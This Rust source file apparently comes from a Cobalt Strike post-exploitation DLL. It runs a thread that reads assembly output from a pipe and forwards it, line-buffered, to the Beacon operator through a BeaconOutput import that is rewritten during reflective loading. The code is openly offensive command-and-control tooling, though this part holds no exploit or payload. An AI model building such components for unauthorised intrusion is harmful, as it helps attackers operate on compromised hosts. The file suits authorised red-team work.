//! Background reader thread: pull bytes from the orchestrator's pipe and
//! forward them to the operator via the imported `BeaconOutput`.
//!
//! Smartinject rewrites the `BeaconOutput` IAT entry at reflective load
//! time so it points at a CS proxy that writes to `pipes::G_PIPE_HANDLE`.
//! From our point of view it's just a normal extern "C" call.
//!
//! Runs in parallel with the assembly invoke so output arrives live;
//! latency = Beacon sleep cycle.

use core::ffi::c_void;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
// CreateThread expects an `Option<unsafe extern "system" fn>` — but the
// thread proc raw arg is typed `*mut c_void`, so the HANDLE→*mut c_void
// conversion happens at the call site.
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject};

use crate::beacon_api::{CALLBACK_OUTPUT, output};

/// Thread proc: read pipe → BeaconOutput.
///
/// Bytes are accumulated into a growable buffer and flushed to BeaconOutput
/// only when a newline arrives or when the buffer reaches a high-water mark
/// (32 KiB). This keeps the operator-side display tidy — each visible
/// "[+] [job N] ..." line corresponds to a complete output line on the
/// target, instead of one prefix per pipe-chunk fragment.
///
/// On EOF / broken pipe (the orchestrator closed the write end and
/// CancelIoEx fired) we flush any partial trailing data, then exit.
unsafe extern "system" fn thread_proc(arg: *mut c_void) -> u32 {
    unsafe {
        let pipe_read: HANDLE = arg as HANDLE;
        let mut read_buf = [0u8; 8192];
        let mut acc: alloc::vec::Vec<u8> = alloc::vec::Vec::with_capacity(32 * 1024);
        const HIGH_WATER: usize = 32 * 1024;

        loop {
            let mut n: u32 = 0;
            let ok = ReadFile(
                pipe_read,
                read_buf.as_mut_ptr(),
                read_buf.len() as u32,
                &mut n,
                core::ptr::null_mut(),
            );
            if ok == 0 || n == 0 {
                break; // EOF, ERROR_BROKEN_PIPE, or ERROR_OPERATION_ABORTED.
            }
            acc.extend_from_slice(&read_buf[..n as usize]);

            // Flush every line-terminated chunk. Anything after the last
            // newline stays buffered for the next read.
            let mut last_nl: Option<usize> = None;
            for (i, b) in acc.iter().enumerate() {
                if *b == b'\n' {
                    last_nl = Some(i);
                }
            }
            if let Some(idx) = last_nl {
                let flush_end = idx + 1;
                // Collapse runs of whitespace-only newlines into a single
                // newline so NLog's blank separator lines don't each
                // become their own "[+] [job N]" prefix on the operator
                // side. Keeps the visible output dense and readable.
                let flushable = &acc[..flush_end];
                let mut squashed: alloc::vec::Vec<u8> =
                    alloc::vec::Vec::with_capacity(flushable.len());
                let mut last_was_blank_nl = false;
                let mut line_start = 0usize;
                for (i, &b) in flushable.iter().enumerate() {
                    if b == b'\n' {
                        let line = &flushable[line_start..i];
                        let is_blank = line.iter().all(|c| c.is_ascii_whitespace());
                        if is_blank && last_was_blank_nl {
                            // Drop this blank.
                        } else {
                            squashed.extend_from_slice(line);
                            squashed.push(b'\n');
                            last_was_blank_nl = is_blank;
                        }
                        line_start = i + 1;
                    }
                }
                if !squashed.is_empty() {
                    output(CALLBACK_OUTPUT, &squashed);
                }
                acc.drain(..flush_end);
            } else if acc.len() >= HIGH_WATER {
                output(CALLBACK_OUTPUT, &acc);
                acc.clear();
            }
        }
        // Final partial line (no trailing newline) — emit so we don't lose
        // the last write.
        if !acc.is_empty() {
            output(CALLBACK_OUTPUT, &acc);
        }
        0
    }
}

/// Spawn the reader. Caller owns the returned handle and must join it
/// before exiting the postex DLL so the final bytes aren't lost when the
/// orchestrator's IoChannel closes the write end.
pub unsafe fn spawn(pipe_read: HANDLE) -> HANDLE {
    unsafe {
        CreateThread(
            core::ptr::null(),
            0,
            Some(thread_proc),
            pipe_read,
            0,
            core::ptr::null_mut(),
        )
    }
}

/// Wait for the reader to drain, then close the thread handle.
pub unsafe fn join(thread: HANDLE) {
    unsafe {
        if thread != INVALID_HANDLE_VALUE && !thread.is_null() {
            WaitForSingleObject(thread, INFINITE);
            CloseHandle(thread);
        }
    }
}
